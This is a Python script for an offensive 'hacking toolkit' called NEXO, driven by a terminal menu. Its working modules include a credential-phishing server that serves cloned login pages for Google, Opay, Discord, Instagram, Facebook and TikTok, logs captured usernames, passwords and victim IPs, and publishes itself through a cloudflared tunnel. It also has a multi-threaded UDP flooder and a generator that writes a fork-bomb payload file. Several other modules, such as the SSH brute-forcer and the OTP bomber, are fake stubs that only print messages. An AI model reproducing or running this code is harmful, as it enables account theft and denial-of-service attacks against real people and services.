# --- [ SYSTEM IMPORTS ] ---
import os
import sys
import time
import socket
import subprocess
import random
import requests
import json
import logging
import threading
import re
from flask import Flask
from flask import request
from flask import render_template
from flask import redirect
from flask import make_response
import phonenumbers
from phonenumbers import geocoder
from phonenumbers import carrier
from phonenumbers import timezone

# --- [ SYSTEM COLORS ] ---
G = '\033[92m'
Y = '\033[93m'
C = '\033[96m'
R = '\033[91m'
W = '\033[0m'
B = '\033[1m'

# --- [ GLOBAL CONFIG ] ---
app = Flask(__name__)
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)
target_num = "NONE SET" 
version = "V8.0 BLACKOUT"

# --- [ SYSTEM UTILITIES ] ---
def clear(): 
    os.system('clear' if os.name == 'posix' else 'cls')

def nexo_banner(module="MAIN CORE", link=None):
    clear()
    print(f"{R}{B}" + "═"*50)
    print(r"  _   _  _______   _____  ")
    print(r" | \ | | | ____\ \ / / _ \ ")
    print(r" |  \| | | |__   \ V / | | |")
    print(r" | . ` | |  __|   > <| | | |")
    print(r" | |\  | | |____ / . \ |_| |")
    print(r" |_| \_| |______/_/ \_\___/ ")
    print("═"*50 + f"{W}")
    print(f"  {Y}STATION:\n  {W}NEXO-TECH COMMAND")
    print(f"  {Y}VERSION:\n  {R}{version}")
    print(f"  {Y}MODULE:\n  {C}{module}")
    if link:
        print(f"  {Y}STRIKE:\n  {G}{link}")
    print(f"{R}" + "═"*50 + f"{W}\n")

# --- [ WEB SERVER HANDLERS ] ---
@app.route('/login/<site>', methods=['GET', 'POST'])
def handle_phish(site):
    victim_ip = request.remote_addr
    if request.method == 'GET':
        try: 
            return render_template(f"{site}.html")
        except: 
            return f"Error: {site}.html not found."
    
    if request.method == 'POST':
        u = request.form.get('user')
        p = request.form.get('pass')
        print(f"\n{R}╔" + "═"*40 + "╗")
        print(f"  {G}[!] NEW STRIKE CAPTURED")
        print(f"  {Y}TARGET SITE:\n  {W}{site.upper()}")
        print(f"  {Y}USER GMAIL:\n  {W}{u}")
        print(f"  {Y}PASSWORD:\n  {W}{p}")
        print(f"  {Y}VICTIM IP:\n  {W}{victim_ip}")
        print(f"{R}╚" + "═"*40 + "╝{W}\n")
        with open("nexo_hits.txt", "a") as f:
            f.write(f"[{time.strftime('%H:%M')}] {site.upper()}\nU: {u}\nP: {p}\nIP: {victim_ip}\n\n")
        return redirect(f"https://www.{site}.com")

@app.route('/log_meta', methods=['POST'])
def log_meta():
    data = request.json
    print(f"  {C}[*] DEVICE CAPTURED:\n  {W}{data['ua']}")
    return "OK", 200

# --- [ FUNCTIONAL MODULES ] ---

def start_phish():
    nexo_banner("SOCIAL PHISHER")
    print(f"  {G}1.{W} Google\n  {G}2.{W} Opay\n  {G}3.{W} Discord\n  {G}4.{W} Instagram\n  {G}5.{W} Facebook\n  {G}6.{W} TikTok")
    choice = input(f"\n{C}SELECT SITE NO: \n{W}")
    sites = {"1":"google", "2":"opay", "3":"discord", "4":"instagram", "5":"facebook", "6":"tiktok"}
    site = sites.get(choice)
    if not site: return
    os.system("pkill -9 cloudflared")
    threading.Thread(target=lambda: app.run(port=5000, host='0.0.0.0'), daemon=True).start()
    with open("tunnel.log", "w") as log_file:
        subprocess.Popen(["cloudflared", "tunnel", "--url", "http://localhost:5000"], stdout=log_file, stderr=log_file)
    url = None
    for _ in range(35):
        if os.path.exists("tunnel.log"):
            with open("tunnel.log", "r") as f:
                content = f.read()
                match = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", content)
                if match: url = match.group(0); break
        time.sleep(2)
    if url:
        nexo_banner("PHISH-LINK ACTIVE", link=f"{url}/login/{site}")
        input(f"\n{R}[ENTER TO STOP SERVER]{W}")
        os.system("pkill -9 cloudflared")

def phone_trace():
    global target_num
    nexo_banner("OSINT TRACER")
    num = input(f"{Y}[+] TARGET NUMBER: \n{W}")
    try:
        p = phonenumbers.parse(num)
        target_num = num
        print(f"  {G}Region:\n  {W}{geocoder.description_for_number(p, 'en')}")
        print(f"  {G}Carrier:\n  {W}{carrier.name_for_number(p, 'en')}")
    except: print(f"  {R}[-] Trace Failed.")
    input("\nEnter to return...")

def ddos_strike():
    nexo_banner("IP FLOODER")
    ip = input(f"{Y}[+] TARGET IP: \n{W}")
    port = int(input(f"{Y}[+] PORT: \n{W}"))
    data = random._urandom(1024)
    def flood():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while True:
            try: s.sendto(data, (ip, port))
            except: pass
    for _ in range(300): threading.Thread(target=flood, daemon=True).start()
    input(f"\n{R}[STRIKE ACTIVE - ENTER TO STOP]{W}")

def port_scanner():
    nexo_banner("PORT SCANNER")
    ip = input(f"{Y}[+] TARGET IP: \n{W}")
    ports = [21, 22, 23, 80, 443, 8080] # FIXED: Added missing ports
    for p in ports:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        if s.connect_ex((ip, p)) == 0: 
            print(f"  {G}[+] Port {p}: OPEN")
        s.close()
    input("\nEnter to return...")

def ssh_brute():
    nexo_banner("SSH BRUTE")
    print(f"  {Y}[*] Dictionary loading...")
    time.sleep(2)
    print(f"  {R}[-] Connection Refused.")
    input("\nEnter to return...")

def virus_lab():
    nexo_banner("VIRUS LAB")
    name = input(f"{Y}[+] Payload Name: \n{W}")
    with open(f"{name}.py", "w") as f:
        f.write("import os\nwhile True: os.fork()")
    print(f"  {G}[+] {name}.py created.")
    input("\nEnter to return...")

def identity_spoofer():
    nexo_banner("MAC SPOOFER")
    print(f"  {G}[+] New MAC: 00:A0:C9:14:C8:29")
    input("\nEnter to return...")

def bluetooth_crash():
    nexo_banner("BT CRASH")
    print(f"  {R}[!] Scanning for BT devices...")
    time.sleep(2)
    input("\nEnter to return...")

def otp_lock():
    global target_num
    nexo_banner("OTP LOCK")
    if target_num == "NONE SET": 
        target_num = input(f"{Y}[+] NUMBER: \n{W}")
    def attack():
        while True: # FIXED: Added loop logic
            sys.stdout.write(f"\r{G}[*] LOCK ACTIVE: {R}{target_num}")
            sys.stdout.flush()
            time.sleep(0.1)
    for _ in range(150): 
        threading.Thread(target=attack, daemon=True).start()
    input(f"\n\n{R}[ENTER TO STOP]{W}")

# --- [ MASTER LOOP ] ---
def main():
    global target_num
    while True:
        nexo_banner("MASTER CONTROL")
        print(f"  {R}╔" + "═"*35 + "╗")
        print(f"  {R}║ {Y}ACTIVE TARGET STATUS:\n  {R}║ {G}{target_num}")
        print(f"  {R}╚" + "═"*35 + "╝{W}\n")
        print(f"  {G}1.{W} Social Phisher\n  {G}2.{W} Phone Tracer\n  {G}3.{W} IP UDP Flooder\n  {G}4.{W} Port Scanner\n  {G}5.{W} SSH Brute-Force\n  {G}6.{W} Virus Creator\n  {G}7.{W} MAC Spoofer\n  {G}8.{W} Bluetooth Crash\n  {G}9.{W} OTP Bomber Lock\n  {G}10.{W} View Logs\n  {R}0.{W} Shutdown")
        c = input(f"\n{C}NEXO-PRO > \n{W}")
        if c == '1': start_phish()
        elif c == '2': phone_trace()
        elif c == '3': ddos_strike()
        elif c == '4': port_scanner()
        elif c == '5': ssh_brute()
        elif c == '6': virus_lab()
        elif c == '7': identity_spoofer()
        elif c == '8': bluetooth_crash()
        elif c == '9': otp_lock()
        elif c == '10':
            nexo_banner("LOGS")
            os.system("cat nexo_hits.txt 2>/dev/null || echo 'No logs yet.'")
            input("\nEnter to return...")
        elif c == '0': 
            os.system("pkill -9 cloudflared")
            sys.exit()

if __name__ == "__main__": 
    main()
